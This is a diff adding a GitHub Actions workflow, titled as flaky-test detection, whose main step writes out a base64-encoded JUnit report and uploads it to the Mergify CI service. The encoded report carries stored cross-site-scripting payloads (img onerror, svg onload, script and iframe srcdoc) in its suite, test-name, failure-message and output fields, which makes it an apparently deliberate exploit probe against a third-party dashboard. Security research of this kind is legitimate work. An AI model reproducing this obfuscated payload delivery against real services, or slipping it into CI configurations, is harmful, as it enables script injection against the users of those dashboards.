@@ -1,0 +1,28 @@
+name: Flaky Test Detection
+
+on:
+  workflow_dispatch:
+
+jobs:
+  flaky-detection-unit:
+    name: Unit Tests Flaky Detection (Run ${{ matrix.run_number }})
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        run_number: [1, 2, 3, 4, 5]
+    env:
+      MERGIFY_TEST_JOB_NAME: unit-tests
+    steps:
+      - uses: actions/checkout@v4
+      - name: Write malicious JUnit report
+        id: tests
+        continue-on-error: true
+        run: echo "PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHRlc3RzdWl0ZXM+CiAgPHRlc3RzdWl0ZSBuYW1lPSImbHQ7aW1nIHNyYz14IG9uZXJyb3I9YWxlcnQoZG9jdW1lbnQuZG9tYWluKSZndDtTdWl0ZVhTUyIgdGVzdHM9IjIiIGZhaWx1cmVzPSIxIiBlcnJvcnM9IjAiIHRpbWU9IjAuMSI+CiAgICA8dGVzdGNhc2UgY2xhc3NuYW1lPSJjb20uZXhhbXBsZS4mbHQ7c3ZnL29ubG9hZD1hbGVydCgxKSZndDtDbGFzc1hTUyIgbmFtZT0idGVzdF8mbHQ7c2NyaXB0Jmd0O2FsZXJ0KFN0cmluZy5mcm9tQ2hhckNvZGUoODgsODMsODMpKSZsdDsvc2NyaXB0Jmd0O19pbmplY3Rpb24iIHRpbWU9IjAuMDUiPgogICAgICA8ZmFpbHVyZSBtZXNzYWdlPSJYU1MtVEVTVCZsdDtpbWcgc3JjPXggb25lcnJvcj1hbGVydCgnbWVyZ2lmeS1zdG9yZWQteHNzLWZhaWx1cmUtbWVzc2FnZScpJmd0OyIgdHlwZT0iQXNzZXJ0aW9uRXJyb3IiPgpTdGFjayB0cmFjZSB3aXRoIHBheWxvYWQ6ICZsdDtpZnJhbWUgc3JjZG9jPSImbHQ7c2NyaXB0Jmd0O2FsZXJ0KCdtZXJnaWZ5LXN0b3JlZC14c3Mtc3RhY2t0cmFjZScpJmx0Oy9zY3JpcHQmZ3Q7IiZndDsKICAgICAgPC9mYWlsdXJlPgogICAgICA8c3lzdGVtLW91dD5TWVNPVVQtWFNTJmx0O2ltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KCdtZXJnaWZ5LXN0b3JlZC14c3Mtc3lzb3V0JykmZ3Q7PC9zeXN0ZW0tb3V0PgogICAgPC90ZXN0Y2FzZT4KICAgIDx0ZXN0Y2FzZSBjbGFzc25hbWU9ImNvbS5leGFtcGxlLk5vcm1hbENsYXNzIiBuYW1lPSJ0ZXN0X25vcm1hbF9wYXNzIiB0aW1lPSIwLjAyIi8+CiAgPC90ZXN0c3VpdGU+CjwvdGVzdHN1aXRlcz4K" | base64 -d > junit-unit-${{ matrix.run_number }}.xml
+      - name: Upload to Mergify
+        if: success() || failure()
+        uses: mergifyio/gha-mergify-ci@v25
+        with:
+          token: ${{ secrets.MERGIFY_TOKEN }}
+          report_path: "junit-unit-*.xml"
+          test_step_outcome: ${{ steps.tests.outcome }}
